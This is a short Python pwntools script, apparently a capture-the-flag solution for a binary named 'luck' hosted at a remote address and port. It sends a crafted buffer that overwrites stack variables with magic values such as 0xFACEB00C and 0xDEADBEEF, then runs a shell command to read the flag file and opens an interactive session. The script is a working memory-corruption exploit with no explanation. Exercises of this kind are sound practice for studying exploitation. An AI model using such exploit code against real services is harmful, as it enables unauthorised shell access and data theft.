#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './luck'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2111

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

v4 = 0xAAAAAAAA
v6 = 0xFACEB00C
v7 = 0xDEADBEEF
v8 = 0xAAAAAAAA

r.send(b'A'*0x4 + p32(v4) + b'A'*0x4 + p32(v6) + p32(v7) + p32(v8))
r.sendline(p32(v4))
r.sendline('cat /home/`whoami`/flag')
r.interactive()
